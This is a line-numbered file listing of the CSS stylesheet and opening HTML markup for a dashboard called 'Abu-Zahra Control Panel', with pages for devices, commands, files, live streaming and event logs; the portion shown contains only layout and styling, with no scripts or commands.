+   638→  3137→.login-page::before{content:'';position:absolute;width:600px;height:600px;border-radius:50%;background:radial-gradient(circle,rgba(230,57,70,.08),transparent 70%);top:-200px;right:-200px;pointer-events:none}
+   639→  3138→.login-box{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:40px 36px;width:380px;max-width:90vw;text-align:center;box-shadow:var(--shadow-lg);position:relative;z-index:1}
+   640→  3139→.login-box h1{color:var(--accent);margin-bottom:6px;font-size:26px;font-weight:700;letter-spacing:-.5px}
+   641→  3140→.login-box p{color:var(--text-secondary);margin-bottom:28px;font-size:14px}
+   642→  3141→.login-box input{width:100%;padding:12px 16px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:15px;margin-bottom:12px;outline:none;transition:border var(--transition)}
+   643→  3142→.login-box input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(230,57,70,.15)}
+   644→  3143→.login-box button{width:100%;padding:12px;border:none;border-radius:var(--radius-sm);background:var(--accent);color:#fff;font-size:16px;cursor:pointer;transition:background var(--transition);font-weight:600;margin-top:4px}
+   645→  3144→.login-box button:hover{background:var(--accent-hover);transform:translateY(-1px)}
+   646→  3145→.login-box button:active{transform:translateY(0)}
+   647→  3146→.login-error{color:var(--red);font-size:13px;margin-top:10px;display:none}
+   648→  3147→
+   649→  3148→/* ========== App Layout ========== */
+   650→  3149→.app{display:none;min-height:100vh}
+   651→  3150→
+   652→  3151→/* ========== Sidebar ========== */
+   653→  3152→.sidebar{position:fixed;top:0;right:0;width:var(--sidebar-width);height:100vh;background:var(--surface);border-left:1px solid var(--border);padding:0;z-index:100;transition:transform .3s cubic-bezier(.4,0,.2,1);display:flex;flex-direction:column;overflow-y:auto}
+   654→  3153→.sidebar .logo{padding:20px 20px 16px;border-bottom:1px solid var(--border);margin-bottom:8px;flex-shrink:0}
+   655→  3154→.sidebar .logo h2{color:var(--accent);font-size:18px;font-weight:700;display:flex;align-items:center;gap:8px}
+   656→  3155→.sidebar .logo span{color:var(--text-muted);font-size:11px;display:block;margin-top:2px}
+   657→  3156→.sidebar nav{flex:1;padding:4px 0}
+   658→  3157→.sidebar a{display:flex;align-items:center;padding:10px 20px;color:var(--text-secondary);cursor:pointer;font-size:14px;gap:10px;transition:all var(--transition);border-right:3px solid transparent;position:relative}
+   659→  3158→.sidebar a:hover{background:var(--surface2);color:var(--text)}
+   660→  3159→.sidebar a.active{background:var(--surface2);color:var(--accent);border-right-color:var(--accent);font-weight:600}
+   661→  3160→.sidebar a .nav-badge{margin-right:auto;background:var(--accent);color:#fff;font-size:10px;padding:1px 7px;border-radius:10px;font-weight:700;min-width:18px;text-align:center}
+   662→  3161→.sidebar .sidebar-footer{padding:12px 20px;border-top:1px solid var(--border);flex-shrink:0}
+   663→  3162→.sidebar-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:99;backdrop-filter:blur(2px)}
+   664→  3163→
+   665→  3164→/* ========== Hamburger ========== */
+   666→  3165→.hamburger{display:none;position:fixed;top:12px;right:12px;z-index:150;background:var(--accent);color:#fff;border:none;width:42px;height:42px;border-radius:var(--radius-sm);font-size:20px;cursor:pointer;box-shadow:var(--shadow);transition:background var(--transition)}
+   667→  3166→.hamburger:hover{background:var(--accent-hover)}
+   668→  3167→
+   669→  3168→/* ========== Main Content ========== */
+   670→  3169→.main{margin-right:var(--sidebar-width);padding:24px 28px;min-height:100vh;transition:margin var(--transition)}
+   671→  3170→.page{display:none;animation:fadeIn .25s ease}
+   672→  3171→.page.active{display:block}
+   673→  3172→@keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
+   674→  3173→
+   675→  3174→/* ========== Topbar ========== */
+   676→  3175→.topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px}
+   677→  3176→.topbar h1{font-size:22px;font-weight:700;display:flex;align-items:center;gap:10px}
+   678→  3177→.topbar .time{color:var(--text-secondary);font-size:13px;font-variant-numeric:tabular-nums}
+   679→  3178→.live-indicator{display:inline-flex;align-items:center;gap:6px;background:var(--green-bg);color:var(--green);padding:3px 10px;border-radius:12px;font-size:11px;font-weight:600}
+   680→  3179→.live-indicator .dot{width:7px;height:7px;border-radius:50%;background:var(--green);animation:livePulse 1.5s infinite}
+   681→  3180→.live-indicator.offline{background:var(--red-bg);color:var(--red)}
+   682→  3181→.live-indicator.offline .dot{background:var(--red);animation:none}
+   683→  3182→.live-indicator.connecting{background:var(--yellow-bg);color:var(--yellow)}
+   684→  3183→.live-indicator.connecting .dot{background:var(--yellow);animation:livePulse .8s infinite}
+   685→  3184→@keyframes livePulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
+   686→  3185→
+   687→  3186→/* ========== Global Search ========== */
+   688→  3187→.global-search{position:relative;flex:1;max-width:360px;min-width:200px}
+   689→  3188→.global-search input{width:100%;padding:9px 14px 9px 36px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:13px;outline:none;transition:border var(--transition)}
+   690→  3189→.global-search input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(88,166,255,.15)}
+   691→  3190→.global-search .search-icon{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--text-muted);font-size:14px;pointer-events:none}
+   692→  3191→
+   693→  3192→/* ========== Stats Grid ========== */
+   694→  3193→.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px;margin-bottom:24px}
+   695→  3194→.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:18px 20px;transition:all var(--transition);position:relative;overflow:hidden}
+   696→  3195→.stat-card:hover{border-color:var(--border-light);transform:translateY(-1px);box-shadow:var(--shadow)}
+   697→  3196→.stat-card .stat-icon{width:40px;height:40px;border-radius:var(--radius-sm);display:flex;align-items:center;justify-content:center;font-size:20px;margin-bottom:10px}
+   698→  3197→.stat-card .stat-icon.blue{background:var(--blue-bg);color:var(--blue)}
+   699→  3198→.stat-card .stat-icon.green{background:var(--green-bg);color:var(--green)}
+   700→  3199→.stat-card .stat-icon.yellow{background:var(--yellow-bg);color:var(--yellow)}
+   701→  3200→.stat-card .stat-icon.purple{background:var(--purple-bg);color:var(--purple)}
+   702→  3201→.stat-card .stat-icon.red{background:var(--red-bg);color:var(--red)}
+   703→  3202→.stat-card .stat-icon.orange{background:rgba(240,136,62,.12);color:var(--orange)}
+   704→  3203→.stat-card .label{color:var(--text-secondary);font-size:12px;margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px;font-weight:500}
+   705→  3204→.stat-card .value{font-size:26px;font-weight:700;line-height:1.2}
+   706→  3205→.stat-card .sub{color:var(--text-muted);font-size:11px;margin-top:4px}
+   707→  3206→
+   708→  3207→/* ========== Card ========== */
+   709→  3208→.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:16px;transition:border var(--transition)}
+   710→  3209→.card:hover{border-color:var(--border-light)}
+   711→  3210→.card h3{margin-bottom:16px;font-size:15px;font-weight:600;display:flex;align-items:center;gap:8px;color:var(--text)}
+   712→  3211→
+   713→  3212→/* ========== Filter Bar ========== */
+   714→  3213→.filter-bar{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap;align-items:center}
+   715→  3214→.filter-bar select,.filter-bar input{padding:7px 12px;border-radius:var(--radius-xs);border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:12px;outline:none;transition:border var(--transition)}
+   716→  3215→.filter-bar select:focus,.filter-bar input:focus{border-color:var(--blue)}
+   717→  3216→.filter-bar .filter-label{color:var(--text-muted);font-size:12px;white-space:nowrap}
+   718→  3217→
+   719→  3218→/* ========== Table ========== */
+   720→  3219→.table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch;border-radius:var(--radius-sm);border:1px solid var(--border)}
+   721→  3220→table{width:100%;border-collapse:collapse;min-width:500px}
+   722→  3221→th,td{padding:10px 14px;text-align:right;border-bottom:1px solid var(--border);font-size:13px}
+   723→  3222→th{color:var(--text-secondary);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;background:var(--surface2);position:sticky;top:0}
+   724→  3223→tr:last-child td{border-bottom:none}
+   725→  3224→tr:hover td{background:var(--surface2)}
+   726→  3225→
+   727→  3226→/* ========== Badges ========== */
+   728→  3227→.badge{display:inline-flex;align-items:center;padding:2px 9px;border-radius:12px;font-size:11px;font-weight:600;gap:4px;white-space:nowrap}
+   729→  3228→.badge-green{background:var(--green-bg);color:var(--green)}
+   730→  3229→.badge-red{background:var(--red-bg);color:var(--red)}
+   731→  3230→.badge-yellow{background:var(--yellow-bg);color:var(--yellow)}
+   732→  3231→.badge-blue{background:var(--blue-bg);color:var(--blue)}
+   733→  3232→.badge-purple{background:var(--purple-bg);color:var(--purple)}
+   734→  3233→.badge-orange{background:rgba(240,136,62,.12);color:var(--orange)}
+   735→  3234→
+   736→  3235→/* ========== Buttons ========== */
+   737→  3236→.btn{padding:8px 16px;border:none;border-radius:var(--radius-sm);cursor:pointer;font-size:13px;transition:all var(--transition);display:inline-flex;align-items:center;gap:6px;font-weight:500}
+   738→  3237→.btn:active{transform:scale(.97)}
+   739→  3238→.btn-primary{background:var(--accent);color:#fff}
+   740→  3239→.btn-primary:hover{background:var(--accent-hover)}
+   741→  3240→.btn-secondary{background:var(--surface2);color:var(--text);border:1px solid var(--border)}
+   742→  3241→.btn-secondary:hover{background:var(--surface-hover);border-color:var(--border-light)}
+   743→  3242→.btn-sm{padding:5px 11px;font-size:12px}
+   744→  3243→.btn-danger{background:var(--red-bg);color:var(--red);border:1px solid rgba(248,81,73,.2)}
+   745→  3244→.btn-danger:hover{background:rgba(248,81,73,.2)}
+   746→  3245→.btn-ghost{background:transparent;color:var(--text-secondary);padding:4px 8px}
+   747→  3246→.btn-ghost:hover{color:var(--text);background:var(--surface2)}
+   748→  3247→
+   749→  3248→/* ========== Command Grid ========== */
+   750→  3249→.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}
+   751→  3250→.cmd-btn{padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--surface2);color:var(--text);cursor:pointer;font-size:12px;transition:all var(--transition);text-align:right}
+   752→  3251→.cmd-btn:hover{border-color:var(--accent);background:rgba(230,57,70,.08);transform:translateY(-1px)}
+   753→  3252→.cmd-btn:active{transform:translateY(0)}
+   754→  3253→
+   755→  3254→/* ========== Device Cards ========== */
+   756→  3255→.device-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:18px;cursor:pointer;transition:all var(--transition);position:relative}
+   757→  3256→.device-card:hover{border-color:var(--accent);transform:translateY(-2px);box-shadow:var(--shadow)}
+   758→  3257→.device-card .dc-header{display:flex;align-items:center;gap:10px;margin-bottom:10px}
+   759→  3258→.device-card .dc-status{width:10px;height:10px;border-radius:50%;flex-shrink:0}
+   760→  3259→.device-card .dc-status.online{background:var(--green);box-shadow:0 0 8px rgba(63,185,80,.5);animation:statusGlow 2s infinite}
+   761→  3260→.device-card .dc-status.offline{background:var(--text-muted)}
+   762→  3261→@keyframes statusGlow{0%,100%{box-shadow:0 0 4px rgba(63,185,80,.3)}50%{box-shadow:0 0 12px rgba(63,185,80,.6)}}
+   763→  3262→.device-card .dc-name{font-size:15px;font-weight:600;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+   764→  3263→.device-card .dc-model{color:var(--text-secondary);font-size:12px;margin-bottom:8px}
+   765→  3264→.device-card .dc-meta{display:flex;flex-wrap:wrap;gap:8px;font-size:11px;color:var(--text-muted)}
+   766→  3265→.device-card .dc-meta .meta-item{display:flex;align-items:center;gap:4px}
+   767→  3266→.device-card .dc-meta .meta-item .meta-icon{font-size:13px}
+   768→  3267→.device-cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(290px,1fr));gap:14px}
+   769→  3268→
+   770→  3269→/* Battery Bar */
+   771→  3270→.battery-bar{display:inline-flex;align-items:center;gap:4px}
+   772→  3271→.battery-bar .battery-shell{width:22px;height:11px;border:1.5px solid var(--text-muted);border-radius:3px;position:relative;overflow:hidden}
+   773→  3272→.battery-bar .battery-shell::after{content:'';position:absolute;right:-4px;top:2px;width:3px;height:5px;background:var(--text-muted);border-radius:0 1px 1px 0}
+   774→  3273→.battery-bar .battery-fill{height:100%;border-radius:1px;transition:width .3s}
+   775→  3274→.battery-fill.high{background:var(--green)}
+   776→  3275→.battery-fill.mid{background:var(--yellow)}
+   777→  3276→.battery-fill.low{background:var(--red)}
+   778→  3277→.battery-text{font-size:11px;font-weight:600;min-width:28px}
+   779→  3278→
+   780→  3279→/* Signal Bars */
+   781→  3280→.signal-bars{display:inline-flex;align-items:flex-end;gap:1.5px;height:12px}
+   782→  3281→.signal-bars .bar{width:3px;border-radius:1px;background:var(--border-light);transition:background .3s}
+   783→  3282→.signal-bars .bar.active{background:var(--green)}
+   784→  3283→.signal-bars .bar:nth-child(1){height:3px}
+   785→  3284→.signal-bars .bar:nth-child(2){height:5px}
+   786→  3285→.signal-bars .bar:nth-child(3){height:8px}
+   787→  3286→.signal-bars .bar:nth-child(4){height:11px}
+   788→  3287→
+   789→  3288→/* ========== Command Log ========== */
+   790→  3289→.command-log .cmd-item{padding:12px;border:1px solid var(--border);border-radius:var(--radius-sm);margin-bottom:8px;background:var(--bg);transition:all var(--transition)}
+   791→  3290→.command-log .cmd-item:hover{border-color:var(--border-light)}
+   792→  3291→.command-log .cmd-item .cmd-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;gap:8px}
+   793→  3292→.command-log .cmd-item .cmd-cmd{font-family:'Cascadia Code',monospace;font-size:13px;font-weight:500}
+   794→  3293→.command-log .cmd-item .cmd-meta{color:var(--text-muted);font-size:11px;display:flex;gap:12px;flex-wrap:wrap}
+   795→  3294→.command-log .cmd-item .cmd-result{margin-top:8px;padding:10px;background:var(--surface2);border-radius:var(--radius-xs);font-size:12px;font-family:monospace;color:var(--text-secondary);max-height:200px;overflow-y:auto;word-break:break-all;white-space:pre-wrap;display:none;border:1px solid var(--border)}
+   796→  3295→.command-log .cmd-item .cmd-result.expanded{display:block}
+   797→  3296→.cmd-item .spinner{display:inline-block;width:12px;height:12px;border:2px solid var(--border);border-top-color:var(--yellow);border-radius:50%;animation:spin .8s linear infinite}
+   798→  3297→@keyframes spin{to{transform:rotate(360deg)}}
+   799→  3298→
+   800→  3299→/* ========== Event Log ========== */
+   801→  3300→.event-log{max-height:600px;overflow-y:auto}
+   802→  3301→.event-item{display:grid;grid-template-columns:1fr auto auto auto;gap:8px;padding:10px 12px;border-bottom:1px solid var(--border);font-size:12px;align-items:center;transition:background var(--transition)}
+   803→  3302→.event-item:hover{background:var(--surface2)}
+   804→  3303→.event-item .ev-time{color:var(--text-muted);font-family:monospace;font-size:11px;white-space:nowrap}
+   805→  3304→.event-item .ev-device{color:var(--blue);font-weight:500}
+   806→  3305→.event-item .ev-type{padding:2px 8px;border-radius:10px;font-size:10px;font-weight:600;text-transform:uppercase;white-space:nowrap}
+   807→  3306→.event-item .ev-type.security{background:var(--red-bg);color:var(--red)}
+   808→  3307→.event-item .ev-type.info{background:var(--blue-bg);color:var(--blue)}
+   809→  3308→.event-item .ev-type.warning{background:var(--yellow-bg);color:var(--yellow)}
+   810→  3309→.event-item .ev-type.success{background:var(--green-bg);color:var(--green)}
+   811→  3310→.event-item .ev-details{color:var(--text-secondary);grid-column:1/-1;font-size:11px}
+   812→  3311→.auto-scroll-bar{display:flex;align-items:center;gap:8px;margin-bottom:10px}
+   813→  3312→.auto-scroll-bar label{font-size:12px;color:var(--text-secondary);display:flex;align-items:center;gap:6px;cursor:pointer}
+   814→  3313→.auto-scroll-bar label input{accent-color:var(--accent)}
+   815→  3314→
+   816→  3315→/* ========== Notification Toast ========== */
+   817→  3316→.notification{position:fixed;top:20px;left:20px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-sm);padding:12px 20px;z-index:300;transform:translateX(calc(-100% - 40px));transition:transform .3s cubic-bezier(.4,0,.2,1);font-size:14px;box-shadow:var(--shadow-lg);display:flex;align-items:center;gap:8px}
+   818→  3317→.notification.show{transform:translateX(0)}
+   819→  3318→
+   820→  3319→/* ========== Modal ========== */
+   821→  3320→.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:200;align-items:center;justify-content:center;backdrop-filter:blur(4px)}
+   822→  3321→.modal-overlay.show{display:flex}
+   823→  3322→.modal{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:24px;width:540px;max-width:90vw;max-height:80vh;overflow-y:auto;box-shadow:var(--shadow-lg)}
+   824→  3323→
+   825→  3324→/* ========== Tabs ========== */
+   826→  3325→.tabs{display:flex;gap:4px;margin-bottom:16px;flex-wrap:wrap}
+   827→  3326→.tab{padding:7px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);background:transparent;color:var(--text-secondary);cursor:pointer;font-size:12px;transition:all var(--transition);font-weight:500}
+   828→  3327→.tab:hover{background:var(--surface2);color:var(--text)}
+   829→  3328→.tab.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+   830→  3329→
+   831→  3330→/* ========== Log Item (legacy) ========== */
+   832→  3331→.log-item{padding:8px 0;border-bottom:1px solid var(--border);font-size:12px;display:flex;gap:12px}
+   833→  3332→.log-item .time{color:var(--text-muted);white-space:nowrap;font-family:monospace}
+   834→  3333→.log-item .event{flex:1}
+   835→  3334→
+   836→  3335→/* ========== Search Box ========== */
+   837→  3336→.search-box{display:flex;gap:8px;margin-bottom:16px}
+   838→  3337→.search-box input,.search-box select{flex:1;padding:9px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:13px;outline:none;transition:border var(--transition)}
+   839→  3338→.search-box input:focus,.search-box select:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(88,166,255,.12)}
+   840→  3339→
+   841→  3340→/* ========== Empty State ========== */
+   842→  3341→.empty{text-align:center;color:var(--text-muted);padding:40px 20px;font-size:14px}
+   843→  3342→.empty .empty-icon{font-size:40px;margin-bottom:10px;opacity:.5}
+   844→  3343→
+   845→  3344→/* ========== Pulse ========== */
+   846→  3345→.pulse{animation:pulse 2s infinite}
+   847→  3346→@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+   848→  3347→
+   849→  3348→/* ========== Streaming ========== */
+   850→  3349→.stream-layout{display:grid;grid-template-columns:320px 1fr;gap:16px;min-height:500px}
+   851→  3350→.stream-controls{display:flex;flex-direction:column;gap:12px}
+   852→  3351→.stream-viewer{position:relative;background:#000;border-radius:var(--radius);overflow:hidden;aspect-ratio:16/9;display:flex;align-items:center;justify-content:center}
+   853→  3352→.stream-viewer video,.stream-viewer canvas,.stream-viewer img{width:100%;height:100%;object-fit:contain}
+   854→  3353→.stream-viewer .no-stream{color:var(--text-secondary);text-align:center;font-size:15px}
+   855→  3354→.stream-viewer .stream-badge{position:absolute;top:12px;left:12px;background:rgba(230,57,70,.9);color:#fff;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:600;display:flex;align-items:center;gap:6px;backdrop-filter:blur(4px)}
+   856→  3355→.stream-viewer .stream-badge.live::before{content:'';width:8px;height:8px;background:#fff;border-radius:50%;animation:pulse 1s infinite}
+   857→  3356→.stream-type-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
+   858→  3357→.stream-type-btn{padding:14px 8px;border-radius:10px;border:2px solid var(--border);background:var(--surface2);color:var(--text);cursor:pointer;font-size:13px;transition:all var(--transition);text-align:center}
+   859→  3358→.stream-type-btn:hover{border-color:var(--accent);background:rgba(230,57,70,.05)}
+   860→  3359→.stream-type-btn.active{border-color:var(--accent);background:rgba(230,57,70,.12)}
+   861→  3360→.stream-type-btn .st-icon{font-size:28px;display:block;margin-bottom:4px}
+   862→  3361→.stream-actions{display:flex;gap:8px;flex-wrap:wrap}
+   863→  3362→.stream-actions .btn{flex:1;min-width:120px;justify-content:center;padding:12px}
+   864→  3363→.stream-info{padding:12px;background:var(--surface2);border-radius:var(--radius-sm);font-size:12px;color:var(--text-secondary)}
+   865→  3364→.stream-info div{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--border)}
+   866→  3365→.stream-info div:last-child{border:none}
+   867→  3366→.stream-quality{display:flex;gap:6px;flex-wrap:wrap}
+   868→  3367→.stream-quality button{padding:6px 14px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--text-secondary);cursor:pointer;font-size:12px;transition:all var(--transition)}
+   869→  3368→.stream-quality button.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+   870→  3369→.audio-bars{display:flex;align-items:center;gap:3px;height:60px;padding:0 20px}
+   871→  3370→.audio-bars .bar{width:4px;background:var(--accent);border-radius:2px;transition:height .1s}
+   872→  3371→
+   873→  3372→/* ========== Relative Time ========== */
+   874→  3373→.relative-time{color:var(--text-muted);font-size:11px}
+   875→  3374→
+   876→  3375→/* ========== Responsive ========== */
+   877→  3376→@media(max-width:768px){
+   878→  3377→  .sidebar{transform:translateX(100%)}
+   879→  3378→  .sidebar.open{transform:translateX(0)}
+   880→  3379→  .sidebar-overlay.open{display:block}
+   881→  3380→  .main{margin-right:0;padding:16px;padding-top:64px}
+   882→  3381→  .hamburger{display:flex;align-items:center;justify-content:center}
+   883→  3382→  .stats-grid{grid-template-columns:repeat(2,1fr);gap:10px}
+   884→  3383→  .device-cards{grid-template-columns:1fr}
+   885→  3384→  .cmd-grid{grid-template-columns:repeat(auto-fill,minmax(150px,1fr))}
+   886→  3385→  .event-item{grid-template-columns:1fr;gap:4px}
+   887→  3386→  .event-item .ev-details{grid-column:auto}
+   888→  3387→  .global-search{max-width:100%;min-width:0}
+   889→  3388→  .stream-layout{grid-template-columns:1fr}
+   890→  3389→  .topbar h1{font-size:18px}
+   891→  3390→  .filter-bar{flex-direction:column;align-items:stretch}
+   892→  3391→  .filter-bar select,.filter-bar input{width:100%}
+   893→  3392→}
+   894→  3393→@media(max-width:480px){
+   895→  3394→  .stats-grid{grid-template-columns:1fr 1fr}
+   896→  3395→  .stat-card .value{font-size:20px}
+   897→  3396→  .stats-grid .stat-card{padding:14px 16px}
+   898→  3397→  .device-cards{grid-template-columns:1fr}
+   899→  3398→  .cmd-grid{grid-template-columns:1fr 1fr}
+   900→  3399→}
+   901→  3400→@media(min-width:1400px){
+   902→  3401→  .device-cards{grid-template-columns:repeat(auto-fill,minmax(320px,1fr))}
+   903→  3402→  .cmd-grid{grid-template-columns:repeat(auto-fill,minmax(220px,1fr))}
+   904→  3403→}
+   905→  3404→</style>
+   906→  3405→</head>
+   907→  3406→<body>
+   908→  3407→
+   909→  3408→<!-- Login Page -->
+   910→  3409→<div class="login-page" id="loginPage">
+   911→  3410→<div class="login-box">
+   912→  3411→<h1>&#x1F7E5; Abu-Zahra</h1>
+   913→  3412→<p>Control Dashboard</p>
+   914→  3413→<input type="text" id="loginUser" placeholder="Username" value="admin">
+   915→  3414→<input type="password" id="loginPass" placeholder="Password">
+   916→  3415→<button onclick="doLogin()">Login</button>
+   917→  3416→<div class="login-error" id="loginError">Invalid credentials</div>
+   918→  3417→</div>
+   919→  3418→</div>
+   920→  3419→
+   921→  3420→<!-- Hamburger -->
+   922→  3421→<button class="hamburger" id="hamburger" onclick="toggleSidebar()">&#9776;</button>
+   923→  3422→
+   924→  3423→<!-- Sidebar Overlay (mobile) -->
+   925→  3424→<div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+   926→  3425→
+   927→  3426→<!-- App -->
+   928→  3427→<div class="app" id="app">
+   929→  3428→<nav class="sidebar" id="sidebar">
+   930→  3429→<div class="logo">
+   931→  3430→  <h2>&#x1F7E5; Abu-Zahra</h2>
+   932→  3431→  <span>Control Panel v4.0</span>
+   933→  3432→</div>
+   934→  3433→<nav>
+   935→  3434→<a class="active" data-page="dashboard" onclick="showPage('dashboard',this)">&#x1F4CA; Dashboard</a>
+   936→  3435→<a data-page="devices" onclick="showPage('devices',this)">&#x1F4F1; Devices</a>
+   937→  3436→<a data-page="commands" onclick="showPage('commands',this)">&#x1F3AE; Commands</a>
+   938→  3437→<a data-page="files" onclick="showPage('files',this)">&#x1F4C2; Files</a>
+   939→  3438→<a data-page="data" onclick="showPage('data',this)">&#x1F4E6; Data</a>
+   940→  3439→<a data-page="streaming" onclick="showPage('streaming',this)">&#x1F4E1; Live Stream</a>
+   941→  3440→<a data-page="monitor" onclick="showPage('monitor',this)">&#x1F50D; Monitor</a>
+   942→  3441→<a data-page="events" onclick="showPage('events',this)">&#x1F4CB; Events</a>
+   943→  3442→<a data-page="settings" onclick="showPage('settings',this)">&#x2699;&#xFE0F; Settings</a>
+   944→  3443→</nav>
+   945→  3444→<div class="sidebar-footer">
+   946→  3445→<a onclick="doLogout()" style="color:var(--red)">&#x1F6AA; Logout</a>
+   947→  3446→</div>
+   948→  3447→</nav>
+   949→  3448→
+   950→  3449→<div class="main">
+   951→  3450→
+   952→  3451→<!-- ====== Dashboard Page ====== -->
+   953→  3452→<div class="page active" id="page-dashboard">
+   954→  3453→<div class="topbar">
+   955→  3454→  <h1>&#x1F4CA; Dashboard</h1>
+   956→  3455→  <div style="display:flex;align-items:center;gap:12px">
+   957→  3456→    <div class="live-indicator" id="wsIndicator">
+   958→  3457→      <span class="dot"></span>
+   959→  3458→      <span id="wsStatusText">Connecting</span>
+   960→  3459→    </div>
+   961→  3460→    <span class="time" id="clock"></span>
+   962→  3461→  </div>
+   963→  3462→</div>
+   964→  3463→<div class="stats-grid" id="statsGrid"></div>
+   965→  3464→<div class="card"><h3>&#x1F4F1; Active Devices</h3><div id="dashDevices" class="device-cards"></div></div>
+   966→  3465→<div class="card"><h3>&#x1F4CB; Recent Commands</h3><div id="dashCommands" class="command-log"></div></div>
+   967→  3466→</div>
+   968→  3467→
+   969→  3468→<!-- ====== Devices Page ====== -->
+   970→  3469→<div class="page" id="page-devices">
+   971→  3470→<div class="topbar">
+   972→  3471→  <h1>&#x1F4F1; Devices</h1>
+   973→  3472→  <button class="btn btn-primary" onclick="generateLink()">&#x1F517; Link Device</button>
+   974→  3473→</div>
+   975→  3474→<div class="global-search" style="max-width:100%;margin-bottom:16px">
+   976→  3475→  <span class="search-icon">&#x1F50D;</span>
+   977→  3476→  <input type="text" id="deviceSearch" placeholder="Search devices by name, model..." oninput="filterDevices()">
+   978→  3477→</div>
+   979→  3478→<div id="linkCodeBox" style="display:none" class="card">
+   980→  3479→  <h3>&#x1F517; Link Code</h3>
+   981→  3480→  <p id="linkCodeText" style="font-size:28px;font-weight:bold;text-align:center;color:var(--accent);letter-spacing:4px"></p>
+   982→  3481→</div>
+   983→  3482→<div class="filter-bar" id="deviceFilters">
+   984→  3483→  <span class="filter-label">Status:</span>
+   985→  3484→  <select id="deviceStatusFilter" onchange="filterDevices()">
+   986→  3485→    <option value="all">All</option>
+   987→  3486→    <option value="online">Online</option>
+   988→  3487→    <option value="offline">Offline</option>
+   989→  3488→  </select>
+   990→  3489→</div>
+   991→  3490→<div class="device-cards" id="deviceList"></div>
+   992→  3491→<div class="card" id="deviceDetail" style="display:none"></div>
+   993→  3492→</div>
+   994→  3493→
+   995→  3494→<!-- ====== Commands Page ====== -->
+   996→  3495→<div class="page" id="page-commands">
+   997→  3496→<div class="topbar"><h1>&#x1F3AE; Command Center</h1></div>
+   998→  3497→<div class="card"><h3>Send Command</h3>
+   999→  3498→  <div class="search-box"><select id="cmdDevice" style="flex:1"></select></div>
+  1000→  3499→  <div class="tabs" id="cmdTabs"></div>
+  1001→  3500→  <div class="cmd-grid" id="cmdGrid"></div>
+  1002→
+  1003→[showing lines 2500-3500 of 5555; use offset=3501 with limit to continue reading]
